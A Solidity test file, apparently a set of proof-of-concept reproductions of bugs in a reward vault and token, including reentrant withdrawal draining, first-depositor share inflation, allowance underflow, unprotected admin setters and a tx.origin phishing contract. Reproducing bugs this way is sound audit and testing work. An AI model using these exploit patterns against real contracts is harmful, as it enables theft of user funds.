// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TestBase.sol";
import "../src/VaultToken.sol";
import "../src/RewardVault.sol";

/// @dev Receiver that pulls its full position again on every incoming payment.
contract ReentrantReceiver {
    RewardVault vault;
    uint256 depth;
    uint256 maxDepth;

    constructor(RewardVault v, uint256 maxDepth_) {
        vault = v;
        maxDepth = maxDepth_;
    }

    function join() external payable {
        vault.deposit{value: address(this).balance}();
    }

    function pull() external {
        vault.withdraw(vault.sharesOf(address(this)) / 2);
    }

    receive() external payable {
        if (depth < maxDepth) {
            depth++;
            vault.withdraw(vault.sharesOf(address(this)) / 2);
        }
    }
}

/// @dev Rejects every ETH payment.
contract RevertingFeeSink {
    receive() external payable {
        revert("no thanks");
    }
}

/// @dev Returns the raw revert data of an external staticcall.
contract RevertProbe {
    function probe(
        address target,
        bytes memory callData
    ) external view returns (bytes memory) {
        (, bytes memory data) = target.staticcall(callData);
        return data;
    }
}

/// @dev Wallet-style contract the owner might interact with.
contract Mallory {
    function setVaultFee(RewardVault v, uint256 bps) external {
        v.setWithdrawFeeBps(bps);
    }
}

contract ReproTest is SpecTest {
    VaultToken token;
    RewardVault vault;

    address owner = address(0xA11CE);
    address alice = address(0xA1);
    address bob = address(0xB2);
    address spender = address(0x5E1);
    address outsider = address(0xE1);

    function setUp() public {
        vm.prank(owner);
        token = new VaultToken();
        vm.prank(owner);
        vault = new RewardVault();
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        vm.deal(owner, 200 ether);
        vm.deal(address(this), 400 ether);
    }

    function test_repro_reentrant_withdraw() public {
        vm.prank(alice);
        vault.deposit{value: 10 ether}();
        ReentrantReceiver rec = new ReentrantReceiver(vault, 1);
        vm.deal(address(rec), 10 ether);
        rec.join();
        vm.prank(owner);
        vault.distributeRewards{value: 20 ether}();
        uint256 entitled = 10 ether + vault.rewards(address(rec));
        rec.pull();
        uint256 received = address(rec).balance;
        emit log_named_uint("entitledWei", entitled);
        emit log_named_uint("receivedWei", received);
        require(received > entitled, "expected more than entitlement");
    }

    function test_repro_allowance_underflow() public {
        vm.prank(owner);
        token.mint(alice, 100 ether);
        vm.prank(spender);
        token.transferFrom(alice, spender, 60 ether);
        uint256 left = token.allowance(alice, spender);
        emit log_named_uint("victimBalance", token.balanceOf(alice));
        emit log_named_uint("spenderBalance", token.balanceOf(spender));
        emit log_named_uint("allowanceAfter", left);
        require(token.balanceOf(spender) == 60 ether, "tokens moved");
        require(left > type(uint128).max, "allowance wrapped");
    }

    function test_repro_share_price_empty() public {
        bytes memory data = new RevertProbe().probe(
            address(vault),
            abi.encodeWithSignature("sharePrice()")
        );
        uint256 code = panicCode(data);
        emit log_named_uint("panicCode", code);
        require(code == 0x12, "expected div-by-zero panic");
    }

    function test_repro_first_depositor_inflation() public {
        vm.deal(owner, 1);
        vm.prank(owner);
        vault.deposit{value: 1}();
        (bool ok, ) = address(vault).call{value: 10 ether}("");
        require(ok, "donation");
        vm.prank(alice);
        vault.deposit{value: 1 ether}();
        uint256 victimShares = vault.sharesOf(alice);
        uint256 ownerBefore = owner.balance;
        vm.prank(owner);
        vault.withdraw(1);
        uint256 ownerGain = owner.balance - ownerBefore;
        emit log_named_uint("victimShares", victimShares);
        emit log_named_uint("firstDepositorProceeds", ownerGain);
        require(victimShares == 0, "victim shares zeroed");
        require(ownerGain > 10 ether, "attacker takes victim funds");
    }

    function test_repro_fee_recipient_anyone() public {
        vm.prank(outsider);
        vault.setFeeRecipient(outsider);
        emit log_named_address("feeRecipient", vault.feeRecipient());
        require(vault.feeRecipient() == outsider, "not redirected");
    }

    function test_repro_tx_origin_admin() public {
        Mallory m = new Mallory();
        vm.prank(owner, owner);
        m.setVaultFee(vault, 1_000);
        emit log_named_uint("feeBps", vault.withdrawFeeBps());
        require(vault.withdrawFeeBps() == 1_000, "fee not set to max");
    }

    function test_repro_fee_transfer_ignored() public {
        RevertingFeeSink sink = new RevertingFeeSink();
        vm.prank(owner, owner);
        vault.setWithdrawFeeBps(1_000);
        vm.prank(owner);
        vault.setFeeRecipient(address(sink));
        vm.prank(alice);
        vault.deposit{value: 10 ether}();
        uint256 before = alice.balance;
        vm.prank(alice);
        vault.withdraw(10 ether);
        uint256 net = alice.balance - before;
        emit log_named_uint("feeExpected", 1 ether);
        emit log_named_uint("feeRecipientBalance", address(sink).balance);
        emit log_named_uint("userNetReceived", net);
        require(address(sink).balance == 0, "fee should be stuck");
        require(net == 9 ether, "accounting treated fee as paid");
    }

    function test_repro_share_truncation() public {
        uint256 huge = (uint256(1) << 128) + 1_000;
        vm.deal(alice, huge);
        vm.prank(alice);
        vault.deposit{value: huge}();
        uint256 recorded = vault.sharesOf(alice);
        emit log_named_uint("deposited", huge);
        emit log_named_uint("sharesRecorded", recorded);
        require(recorded == 1_000, "expected truncated shares");
    }

    function test_repro_reward_holder_loop() public {
        RewardVault v = new RewardVault();
        for (uint256 i = 0; i < 200; i++) {
            address h = address(uint160(0x1000 + i));
            vm.deal(h, 5);
            for (uint256 j = 0; j < 5; j++) {
                vm.prank(h);
                v.deposit{value: 1}();
            }
        }
        uint256 n = v.holderCount();
        (bool ok, ) = address(v).call{gas: 3_000_000, value: 1 ether}(
            abi.encodeWithSelector(RewardVault.distributeRewards.selector)
        );
        emit log_named_uint("holderEntries", n);
        emit log_named_uint("distributeSucceeded", ok ? 1 : 0);
        require(!ok, "expected out-of-gas");
    }

    function test_repro_reward_divide_first() public {
        vm.prank(alice);
        vault.deposit{value: 10 ether}();
        vm.prank(bob);
        vault.deposit{value: 10 ether}();
        uint256 rewardAmount = 1e15;
        uint256 assetsBefore = vault.totalAssets();
        vm.prank(owner);
        vault.distributeRewards{value: rewardAmount}();
        emit log_named_uint("rewardSent", rewardAmount);
        emit log_named_uint("aliceAccrued", vault.rewards(alice));
        emit log_named_uint("stranded", vault.totalAssets() - assetsBefore);
        require(vault.rewards(alice) == 0, "expected zero accrual");
        require(vault.totalAssets() - assetsBefore == rewardAmount, "stranded");
    }
}
